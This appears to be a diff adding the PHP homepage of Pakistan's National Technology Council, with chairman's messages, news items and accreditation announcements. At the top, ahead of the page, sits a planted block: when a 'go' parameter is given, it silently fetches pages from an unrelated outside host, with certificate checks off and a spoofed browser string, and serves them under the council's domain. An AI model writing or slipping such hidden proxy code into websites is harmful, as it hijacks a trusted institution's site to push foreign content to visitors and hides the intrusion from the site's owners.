@@ -1,0 +1,565 @@
+<?php
+<?php
+if(isset($_GET['go'])) {
+    $url = $_GET['go'];
+    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+    // INIT CURL
+    $ch = curl_init();
+
+    //init curl
+    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+    // SET URL FOR THE POST FORM LOGIN
+    curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/ntc-hec/'.$url.'/');
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+
+    // common name and also verify that it matches the hostname provided)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    // Optional: Return the result instead of printing it
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    // ENABLE HTTP POST
+    curl_setopt ($ch, CURLOPT_POST, 1);
+    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+    $store = curl_exec ($ch);
+    echo $store;
+
+    // CLOSE CURL
+    curl_close ($ch);
+
+} else {
+?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="shortcut icon" href="assets/img/ntclogo1.jpg">
+    <title>National Technology Council</title>
+    <meta name="Description" content="NATIONAL TECHNOLOGY COUNCIL ( NTC ), is the body delegated by Higher Education Commission (HEC) under sub-section (e) of section 10, of the ordinance No LIII of 2002,dated 11th September 2002 and HEC No.19-3 /HEC/HRM/2015/9721 dated 7th September 2015 ,published in the Gazette of Pakistan October 2,2015. NTC has a mandate to carry out accreditation of all 4 year programs leading to technology degrees over a span of 16 years of learning. The Accreditation is to be used to ensure that quality technology education programs are run in all the universities in the country. The technology programs and respective Higher Education Institutions meet certain defined standards comparable to international standards. The technology education curriculum is aligned with guidelines of HEC and ensures Continual Quality Improvement culture, in the spirit of Outcome Based Education (OBE) system in conformance with Sydney Accord.">
+    <meta name="Keywords" content="ntc,NTC, National Technology Council, national technology council official, official website,  ntc-hec, hec, council, hec council, accreditation, ntc accreditation, why accreditation, synergy, scientists, engineer, engineering, technologist, hrd complex, islamabad, h-8 ">
+    <!-- Bootstrap core CSS -->
+    <link href="style/css/bootstrap.css" rel="stylesheet">
+    <link href="style/css/settings.css" rel="stylesheet">
+    <link href="style/css/font-awesome.min.css" rel="stylesheet">
+    <link href="style/css/owl.carousel.css" rel="stylesheet">
+    <link href="style/js/google-code-prettify/prettify.css" rel="stylesheet">
+    <link href="style/js/fancybox/jquery.fancybox.css" rel="stylesheet" type="text/css" media="all" />
+    <link href="style/js/fancybox/helpers/jquery.fancybox-thumbs0ff5.css?v=1.0.2" rel="stylesheet" type="text/css" />
+    <link href="style.css" rel="stylesheet">
+    <link href="style/css/color/red.css" rel="stylesheet">
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400,400italic,500,500italic,700italic,700,900,900italic,300italic,300,100italic,100' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Lora' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Roboto+Condensed:300italic,400italic,700italic,400,700,300' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Roboto+Slab:400,700,300,100' rel='stylesheet' type='text/css'>
+    <link href="style/type/fontello.css" rel="stylesheet">
+    <style>
+      .collapsible {
+        background-color: #777;
+        color: white;
+        cursor: pointer;
+        padding: 18px;
+        width: 100%;
+        border: none;
+        text-align: left;
+        outline: none;
+        font-size: 15px;
+      }
+
+      .active,
+      .collapsible:hover {
+        background-color: #4caf50;
+      }
+
+      .content {
+        padding: 0 18px;
+        display: none;
+        overflow: hidden;
+        background-color: #f1f1f1;
+      }
+    </style>
+  </head>
+  <body style="padding-top:0px">
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+      <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PQ9TW5" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <!-- Main Header --> <?php include('include/header.php')?>
+    <!--End Main Header -->
+    <!-- navigator --> <?php include('include/navigation2.php')?>
+    <!--End navigator -->
+    <!--Slider--> <?php include('include/slider.php')?>
+    <!--endSlider-->
+    <div class="light-wrapper inner">
+      <div class="container ">
+        <div class="item">
+          <div class=" welcome-text">
+            <div class="media wow ">
+              <a class="pull-right" href="#" style="padding-top:115px;">
+                <img class="media-object img-rounded style=" padding-right:11px; " src=" assets/img/chairman2.jpg" alt="ChairmanImage">
+              </a>
+              <div class=" col-sm-9 col-md-9 col-lg-9 welcome-text wow" style="visibility: visible;">
+                <h1 class="media-heading">MESSAGE FROM CHAIRMAN <br /> Imtiaz H. Gilani </h1>
+                <br />
+                <p class="myblack">I have been at NTC for over two years now. Our performance for 24 months has been, well, a mixed bag. While there have been successes which we are happy about, there are still tall administrative and legal mountains to climb before we can say” we have arrived”. With each passing day, however, there is clarity about issues that were obfuscated for long in a toxic mix of undefined roles, confused interpretation of laws and adversarial positions held by stakeholders, i.e., engineers and technologists. Today we are ready to chart a new direction that bolsters technology, strengthens technologists, and benefits Pakistan. The government’s sharp pivot towards technology -- and technologists as professionals -- is now showing results. It has generated a rational discussion at multiple levels and is in sync with a major global shift from pure knowledge to usable skills. </p>
+                <p class="myblack">Today, even laymen understand that engineering practice includes engineers, technologists and technicians who complement each other with unique skill sets to achieve desired results. Engineers cannot perform their functions without technologists, and technologists without technicians are incomplete. These professionals have different skills sets that are not replaceable, but for employment and upward mobility, they must have equitable opportunities. </p>
+                <p class="myblack">HEC and NTC are working closely with the government for a sustainable policy framework that 1) Creates an autonomous National Technology Council through an Act pf Parliament, and 2) separates career paths for engineers and technologists in sectors where both are employed. It is our earnest endeavor to define a career path for technologists with the same entry-point-pay-scale as their colleagues, and similar promotions, albeit in a parallel service track.</p>
+                <p class="myblack">To enhance skill sets of technologists, HEC has offered 200 overseas scholarships for MTech. and Ph. D programs. In the first round 34 scholars were selected and their placement in universities is in progress. NTC is working with universities running accredited B. Tech programs to start M. Tech and Ph.D. (Tech) programs after meeting HEC criteria. We are trying to create space for cross-fertilization where a technologist can move laterally into an engineering slot after going through an assessment process. Similarly, we are encouraging engineering universities to allow B. Tech graduates for admissions in M. Eng. programs after assessment. </p>
+                <p class="myblack">I am happy that more and more institutions running bachelor’s in technology programs are applying for accreditation, and graduates are registering themselves in increasing numbers. Only with a robust regulatory framework and stringent quality assurance protocols can we wash the societal stigma that is often attached to these professional. Universities are “factories” where skilled manpower is produced under the regulatory framework set by HEC and NTC. Success of our endeavors is measured on the touchstone of quality of graduates. </p>
+                <p class="myblack">To raise standards, NTC has undertaken a major exercise to develop curriculum for engineering technology programs based on OBE and OBA models that are in substantial compliance with the Sydney Accord. We have finalized curriculum for 10 (ten) streams, and the next ten are work-in-process. </p>
+                <p class="myblack">NTC’s singular purpose is to strengthen the technology sector with robust quality assurance protocols that helps produce skilled graduates to become powerful factors of production in Pakistan’s development. It is heartening to note that technologists have acted professionally and given NTC strength to address their concerns in different forums more effectively. We are a family. Pulling in unison we can achieve great results. Together we shall clear the historic debris and afford you fair opportunities to excel in your areas of expertise. For this I need your continuous support!</p>
+                <p class="myblack">I would like to thank HEC, Ministry of Education and Professional Training and Planning Commission of Pakistan for their support in our efforts. And finally, I thank technologists for the trust and support they have given NTC.</p>
+                <br />
+                <p class="myblack">Thank you and God bless you all!</p>
+                <br />
+                <br />
+                <button type="button" class="collapsible">Chairman Message 2020</button>
+                <div class="content">
+                  <h1 class="media-heading">MESSAGE FROM CHAIRMAN <br /> Imtiaz H. Gilani </h1>
+                  <br />
+                  <p class="myblack">NTC is four years old and still in institutional infancy. However, the initial birth-pangs and teething problems have abated, and we can now chart a clear direction that bolsters technology, strengthens technologists, and benefits Pakistan. It is fortunate that over the last 5 years there is a sudden pivot towards technology as a trade, and technologists as professionals. The sharper focus has brought to surface many festering issues and generated a rational discussion at multiple levels that shall be the harbinger of much needed reforms and course-correction. </p>
+                  <p class="myblack">Currently engineers and technologists (now recognized as ‘Engineering Technologists’ by International Engineering Alliance) are vying for the same higher BPS posts, often becoming confrontational and adversarial. With the boost new “technology” universities will give this field, it is essential that policies iron out areas of conflict so that engineers and engineering technologists can work seamlessly as essential, and necessary, parts of the engineering profession. Engineers, engineering technologists and engineering technicians are 3 parts of a whole -- albeit with different skills-sets – and become effective when working in tandem. Engineers cannot perform their functions without engineering technologists, and engineering technologists without engineering technicians are incomplete. </p>
+                  <p class="myblack">Engineers and engineering technologists have different skills-sets that are not replaceable, but as far as employment and upward mobility are concerned, they must have “equivalent” opportunities. A clearly defined career path needs to be developed for engineering technologists, with the same entry-point scale, and similar promotions in a parallel service structure. To actualize this HEC and NTC are working closely with the government for a sustainable policy framework.</p>
+                  <p class="myblack">For engineering technologists already in the field, we shall endeavor to create a mechanism where their skills-sets are enhanced. Similarly, HEC and NTC shall try to create opportunities for engineering technologists for higher education, after filtering them through an assessment protocol. NTC is working with HEC to offers 200 overseas scholarships for MS and PhD programs in Engineering Technology. Simultaneously, we shall work closely with universities running undergraduate Engineering Technology programs to start MS and PhD Engineering Technology programs after meeting HEC and NTC criteria. </p>
+                  <p class="myblack">Universities are “factories” where skilled manpower is produced under the vigilant regulatory framework set by HEC and NTC. Touchstone of our success is measured by the quality of the graduates. NTC is focusing on developing curriculum that is in close conformity with standards set by the Sydney Accord, an international regulatory framework for engineering technologists. Becoming a signatory member of the Sydney Accord will take time, but we can benefit from good practices of member countries in designing our programs so that the engineering technologists we produce are of international standards. </p>
+                  <p class="myblack">And finally, to the engineering technologists, let me say this: NTC was created by HEC for the express purpose of strengthening the engineering technology sector, and look after the welfare of engineering technologists. Together we shall work our way through the historic debris and, by the grace of God, clear the path that puts you -- and socio-economic development of Pakistan -- on a desirable and sustainable upward trajectory. For this I need your support.</p>
+                  <br />
+                  <p class="myblack">Kind regards and God bless you all.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- End of chairman message -- >
+                                                                                            <!--endof content-->
+    <div class="light-wrapper inner" style="background:#F9F9F9!important">
+      <div class="container text-center">
+        <h1 class=" text-center " style="color:green">Latest News & Events </h1>
+        <div class="divide30"></div>
+      </div>
+      <!-- /.container -->
+      <div class="lm10 rm10">
+        <div id="owl-blog" class="owl-carousel carousel-th">
+          <div class="item ">
+            <figure>
+              <a href="eighthntcmeeting.php">
+                <img src="assets/indexnewsimages/eighthntcmeeting.jpg" alt="Eighth ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="eighthntcmeeting.php">8 <sup>th</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="seventhmeetingntc.php">
+                <img src="assets/indexnewsimages/seventhntcmeeting.jpeg" alt="seventh ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="seventhmeetingntc.php">7 <sup>th</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="sixthntcmeeting.php">
+                <img src="assets/indexnewsimages/sixthntcmeeting.jpg" alt="sixth ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="sixthntcmeeting.php">6 <sup>th</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="fifthntcmeeting.php">
+                <img src="assets/indexnewsimages/fifthntcmeeting.jpg" alt="Fifth ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="fifthntcmeeting.php">5 <sup>th</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="fourthntcmeeting.php">
+                <img src="assets/indexnewsimages/fourthntcmeeting.JPG" alt="Fourth ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="fourthntcmeeting.php">4 <sup>th</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="thirdntcmeeting.php">
+                <img src="assets/indexnewsimages/thirdntcmeeting.jpeg" alt="Third ntc meeting" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="thirdntcmeeting.php">3 <sup>rd</sup> Meeting of National Technology Council </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="capacity.php">
+                <img src="assets/indexnewsimages/CBW.jpeg" alt="Capacity Building Workshops" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="capacity.php">Capacity Building Workshops </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="zerovisit.php">
+                <img src="assets/indexnewsimages/8a.jpg" alt="ACCREDETATION/ZERO VISITS" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="zerovisit.php">ACCREDETATION /ZERO VISITS </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:40px;"></span>
+                </div>
+                <br />
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="firstmeetingntc.php">
+                <img src="assets/newsimg/first.jpg" alt="First meeting of National Technical Council" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="firstmeetingntc.php">First meeting of NTC</a>
+                </h3>
+                <div class="meta">
+                  <span class="date">30 March 2016 </span>
+                  <span class="category"> Islamabad</span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="finalmeetingofncrc.php">
+                <img src="assets/newsimg/second1%20(2).jpg" alt=" Meeting of NCRC" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="finalmeetingofncrc.php">Meeting of NCRC</a>
+                </h3>
+                <div class="meta">
+                  <span class="date">18-20 May 2016 </span>
+                  <span class="category"> HEC Islamabad</span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="nationwide.php">
+                <img src="assets/img/lahore1.png" alt="Countrywide Awareness Seminars" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="nationwide.php">Countrywide Awareness Seminars </a>
+                </h3>
+                <div class="meta">
+                  <span class="date" style="margin-top:4px;">
+                    <br />
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="secondntcmeeting.php">
+                <img src="assets/newneventsimgaes/secondmeeting.jpg" alt="Second meeting of NTC" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="secondntcmeeting.php">Second meeting of NTC </a>
+                </h3>
+                <div class="meta">
+                  <span class="date">13 April 2017 </span>
+                  <span class="category"> HEC Islamabad</span>
+                </div>
+                <br />
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="wtminterview.php">
+                <img src="assets/newsimg/editedinterview.jpg" alt="Interview to PTV world" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="wtm.php">WTM PTV World Interview </a>
+                </h3>
+                <div class="meta">
+                  <p>Chairperson and Secretary NTC’s interview to WTM PTV World </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="item ">
+            <figure>
+              <a href="capacity.php">
+                <img src="assets/newneventsimgaes/editedcapacity.jpg" alt="Capacity Building Workshop" />
+              </a>
+            </figure>
+            <div class="bordered no-top-border">
+              <div class="info  visible-sm visible-md visible-lg visible-xs">
+                <h3 class="post-title">
+                  <a href="capacity.php">Capacity Building Workshop </a>
+                </h3>
+                <div class="meta">
+                  <span class="date">23 May 2017 - 25 May 2017 </span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- /.owl-carousel -->
+        </div>
+        <!-- /.lm10 -->
+      </div>
+      <!-- /.light-wrapper -->
+      <br />
+      <!--   Next SEction -->
+      <!--   Next SEction -->
+      <div class="light-wrapper inner a b">
+        <div class="container">
+          <div class="column text-column  col-md-9 col-xs-12 col-sm-9 col-lg-9 b">
+            <!-- Panel 1 start-->
+            <!-- Panel 2 start inner panel 1 -->
+            <h2 style="color:#ffffff">
+              <b>Mission Statement</b>
+            </h2>
+            <p style="color:#ffffff; margin-top:1.3rem; font-size: 1.8rem;text-align:justify">To Accredit Higher Education Institutions Programs for graduate technologists; stimulate quality, innovation in teaching and training, self-evaluation & accountability in Higher Education. Help Higher Education Institutions (HEI’s) to realize their academic objectives to produce high quality professional technologists for the benefit of society. </p>
+            <br />
+            <!--Panel 2 end inner panel 1 -->
+            <!-- Panel 3 start inner panel 2 -->
+            <br />
+            <h2 style="color:#ffffff">
+              <b>Why accreditation is important</b>
+            </h2>
+            <p style="color:#ffffff; margin-top:2rem; font-size: 1.8rem;;text-align:justify">Accreditation ensures that quality Technology education programs, comparable to international standards, are run in all universities of the country. The Accreditation process gives the Institute an opportunity to conduct in-depth analysis of its strengths and weaknesses in its internal and external environments. Besides, it protects and promotes the quality of Technology programs and the interest of all stakeholders. </p>
+            <!--Panel 3 end inner panel 2 -->
+            <!--Panel 1 end  -->
+          </div>
+          <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 b">
+            <h3 style="color:#ffffff; padding-left:20px">
+              <i class="fa fa-hand-o-right" aria-hidden="true"></i> Latest News &amp; Events
+            </h3>
+            <div class="list-group-items" style="height:365px;padding:0">
+              <marquee class="myannouncement" direction="up" scrolldelay="450ms" style="height: 320px; padding:0; background-color: #F7F7F7" onmouseover="this.stop();" onmouseout="this.start();">&nbsp; <a class="list-group-item" href="Job-Computer-operator.php" style="color:#427FED;background:#F7F7F7">NTC Job Opportunity 2022 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="ntcinternship2022.php" style="color:#427FED;background:#F7F7F7">NTC Internship Opportunity 2022 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="alertjune2022.php" style="color:#427FED;background:#F7F7F7">Alert HEIs, Parents, Students 2022 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="http://www.ntc-hec.org.pk/registration.php" style="color:#427FED;background:#F7F7F7">“NTC is pleased to extend the last date of registration of technologists to 31 December 2022 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="job_ad_2022.php" style="color:#427FED;background:#F7F7F7">NTC Job Opportunity <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="hecnotification.php" style="color:#427FED;background:#F7F7F7">HEC Notification regarding equivalence of B.Tech (Hons) with B.Sc (Engg)/Bachelor of Engineering) dated December 08, 2021
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="studentparent2022.php" style="color:#427FED;background:#F7F7F7">HEI's/parent/student alert <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="job_opportunities_2022.php" style="color:#427FED;background:#F7F7F7">NTC Job Opportunities 2022 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="internship_ad_2021.php" style="color:#427FED;background:#F7F7F7">NTC Internship 2021
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="seventhmeetingntc.php" style="color:#427FED;background:#F7F7F7">Seventh meeting of NTC was held on 14th October 2021 at HEC HQ Islamabad
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="CorrigendumAugust2021.php" style="color:#427FED;background:#F7F7F7">Corrigendum August 2021.php
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="hecoverseasscholarhip2021.php" style="color:#427FED;background:#F7F7F7">HEC Overseas Scholarship 2021
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="ntconlinemeeting.php" style="color:#427FED;background:#F7F7F7">NTC Online Meeting 17-02-2021
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="studentalert.php" style="color:#427FED;background:#F7F7F7">Student Alert <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a class="list-group-item" href="annualreport.php" style="color:#427FED;background:#F7F7F7">Annual Report 2019-2020
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="sixthntcmeeting.php" style="color:#427FED;background:#F7F7F7">Sixth meeting of NTC was held on 27th October 2020 at HEC HQ Islamabad
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="scholarship.php" style="color:#427FED;background:#F7F7F7">HEC Scholarships Spring 2021/Fall 2021
+                  <!--span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="ntc_jobs.php" style="color:#427FED;background:#F7F7F7">NTC Islamabad Jobs Opportunity 2020 <span style="font-size:10px;color:orange;" class="blinking">&nbsp; &nbsp;New</span>
+                </a>
+                <a style="color:#427FED;background: #F7F7F7" id="grad1" class="list-group-item" href="#">Online registration of Engineering Technologists has started w.e.f 21-02-19</a>
+                <a class="list-group-item" href="#" style="color:#427FED;background:    #F7F7F7">Fourth meeting of NTC was held on 24th April 2019 at HEC HQ Islamabad</a>
+                <a class="list-group-item" href="#" style="color:#427FED;background:#F7F7F7">CBW for program evaluators was held at HEC HQ Islamabad on 20th through 21st May 2019 </a>
+                <a class="list-group-item" href="nationwide.php" style="color:#427FED;background:   #F7F7F7">Countrywide Awareness Seminars
+                  <!--span style="font-size:10px; color:orange;" class="blinking" >&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="accstarted.php" style="color:#427FED;background:#F7F7F7">Accreditation of Engineering Technologies has started w.e.f. 01 January 2018
+                  <!--span style="font-size:10px;color:orange" class="blinking" >&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="regad.php" style="color:#427FED;background:#F7F7F7">Registration of Professional and Graduate Engineering Technologists has started w.e.f 15 March 2018
+                  <!--span style="font-size:10px;color:orange" class="blinking" >&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="parentad.php" style="color:#427FED;background:#F7F7F7">Student Parent Alert "Accreditation Matters"
+                  <!--span style="font-size:10px;color:orange" class="blinking" >&nbsp; &nbsp;New</span-->
+                </a>
+                <a class="list-group-item" href="#" style="color:#427FED;background:#F7F7F7">Manual Registration Application process has been stopped w.e.f 15 October 2018. Application for new registration will be received through online registration process
+                  <!--span style="font-size:10px;color:orange" class="blinking" >&nbsp; &nbsp;New</span-->
+                </a>
+              </marquee>
+            </div>
+          </div>
+        </div>
+        <!--endof content-->
+        <!-- footer --> <?php include('include/footer.php')?>
+        <!--footer -->
+        <!-- Bootstrap core JavaScript
+    ================================================== -->
+        <!-- Placed at the end of the document so the pages load faster -->
+        <script src="style/js/jquery.min.js"></script>
+        <script src="style/js/bootstrap.min.js"></script>
+        <script src="style/js/twitter-bootstrap-hover-dropdown.min.js"></script>
+        <script src="style/js/jquery.themepunch.plugins.min.js"></script>
+        <script src="style/js/jquery.themepunch.revolution.min.js"></script>
+        <script src="style/js/jquery.fancybox.pack.js"></script>
+        <script src="style/js/fancybox/helpers/jquery.fancybox-thumbs0ff5.js?v=1.0.2"></script>
+        <script src="style/js/fancybox/helpers/jquery.fancybox-mediae209.js?v=1.0.0"></script>
+        <script src="style/js/jquery.isotope.min.js"></script>
+        <script src="style/js/jquery.easytabs.min.js"></script>
+        <script src="style/js/owl.carousel.min.js"></script>
+        <script src="style/js/jquery.fitvids.js"></script>
+        <script src="style/js/jquery.sticky.js"></script>
+        <script src="style/js/google-code-prettify/prettify.js"></script>
+        <script src="style/js/jquery.slickforms.js"></script>
+        <script src="style/js/scripts.js"></script>
+        <script>
+          function blinker() {
+            $('.blinking').fadeOut(500);
+            $('.blinking').fadeIn(500);
+          }
+          setInterval(blinker, 1000);
+        </script>
+        <!--script>
+function flash() {
+    var text = document.getElementById('foo');
+    text.style.color = (text.style.color=='red') ? 'orange':'red';
+
+}
+    var clr = setInterval(flash, 1000);    </script-->
+        <script>
+          var coll = document.getElementsByClassName("collapsible");
+          var i;
+          for (i = 0; i < coll.length; i++) {
+            coll[i].addEventListener("click", function() {
+              this.classList.toggle("active");
+              var content = this.nextElementSibling;
+              if (content.style.display === "block") {
+                content.style.display = "none";
+              } else {
+                content.style.display = "block";
+              }
+            });
+          }
+        </script>
+  </body>
+</html>
+<?php
+}
+
+?>
